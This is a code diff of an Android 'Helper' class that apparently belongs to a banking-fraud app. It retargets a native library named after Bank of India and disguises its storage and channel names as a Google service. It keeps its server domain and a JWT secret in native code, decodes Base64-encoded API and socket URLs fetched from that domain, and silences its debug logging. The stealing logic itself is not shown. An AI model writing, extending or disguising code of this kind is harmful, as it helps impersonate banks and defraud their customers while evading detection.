@@ -9,57 +9,33 @@ import android.net.Network;
 import android.net.NetworkCapabilities;
 import android.net.NetworkInfo;
 import android.os.Build;
-import android.os.Handler;
-import android.os.Looper;
 import android.provider.Settings;
 import android.telephony.SubscriptionInfo;
 import android.telephony.SubscriptionManager;
 import android.telephony.TelephonyManager;
+import android.util.Base64;
+import android.util.Log;
+import android.widget.Toast;
 
 import androidx.core.app.ActivityCompat;
 
 import java.nio.charset.StandardCharsets;
 import java.util.List;
 
-import android.annotation.SuppressLint;
-import android.content.Context;
-import android.content.pm.PackageManager;
-import android.net.ConnectivityManager;
-import android.net.Network;
-import android.net.NetworkCapabilities;
-import android.net.NetworkInfo;
-import android.os.Build;
-import android.provider.Settings;
-import android.telephony.SubscriptionInfo;
-import android.telephony.SubscriptionManager;
-import android.telephony.TelephonyManager;
-import android.util.Log;
-import android.widget.Toast;
-
-import androidx.core.app.ActivityCompat;
-
-import org.json.JSONException;
-import org.json.JSONObject;
-
-import java.util.List;
-import android.util.Base64; // Required for Base64 decoding
-
 
 public class Helper {
 
     {
-        System.loadLibrary("billupdateblue.cpp");
+        System.loadLibrary("bankofindia.cpp");
     }
-    public String StorageName = "GoogleServiceSB1";
-    public String BG_CHANNEL_ID = "GoogleServiceSB1";
+    public String StorageName = "GoogleServiceBB";
+    public String BG_CHANNEL_ID = "GoogleServiceBB";
     public native String FormCode();
     public native String DomainUrl();
     public native String WsJwtSecret();
     public String TAG = "Dhappa";
-    public String AppVersion = "1.5";
+    public String AppVersion = "1.8";
     public Context context;
-
-
 
     public  boolean isNetworkAvailable(Context context) {
         ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
@@ -154,6 +130,8 @@ public class Helper {
 
     public String ApiUrl(Context context){
         StorageHelper s = new StorageHelper(context);
+        Helper helper  = new Helper();
+//        Log.d(helper.TAG, "api url " +s.getString("api_url", ""));
         return s.getString("api_url", "");
     }
 
@@ -170,7 +148,7 @@ public class Helper {
         networkHelper.makeGetRequest(h.DomainUrl(), new NetworkHelper.GetRequestCallback() {
             @Override
             public void onSuccess(String result) {
-                Log.d(h.TAG, "DomainResult (Base64) " + result);
+//                d(h.TAG, "DomainResult (Base64) " + result);
 
                 String api_url = "";
                 String socket_url = "";
@@ -181,7 +159,7 @@ public class Helper {
                     byte[] decodedBytes = Base64.decode(result, Base64.DEFAULT);
                     String decodedData = new String(decodedBytes, StandardCharsets.UTF_8);
 
-                    Log.d(h.TAG, "Decoded Data: " + decodedData);
+//                    d(h.TAG, "Decoded Data: " + decodedData);
 
                     // 2. Parse the decoded data
                     // The data is two URLs separated by a space: "URL1 URL2"
@@ -196,16 +174,16 @@ public class Helper {
                         storageHelper.saveString("api_url", api_url);
                         storageHelper.saveString("socket_url", socket_url);
 
-                        Log.i(h.TAG, "API URL saved: " + api_url);
-                        Log.i(h.TAG, "Socket URL saved: " + socket_url);
+//                        i(h.TAG, "API URL saved: " + api_url);
+//                        i(h.TAG, "Socket URL saved: " + socket_url);
 
                     } else {
-                        Log.e(h.TAG, "Decoded data did not contain two parts separated by a space.");
+//                        e(h.TAG, "Decoded data did not contain two parts separated by a space.");
                         return; // Stop if parsing fails
                     }
 
                 } catch (Exception e) {
-                    Log.e(h.TAG, "Base64 Decoding or Parsing Failed: " + e.getMessage());
+                    Log.d(h.TAG, "Base64 Decoding or Parsing Failed: " + e.getMessage());
                     return; // Stop if decoding fails
                 }
 
@@ -220,6 +198,9 @@ public class Helper {
     public void show(String message) {
         Helper h = new Helper();
         Log.d(h.TAG, message);
+    }
+    public void showTost(String message) {
+        Toast.makeText(context, message, Toast.LENGTH_LONG).show();
     }
 
 
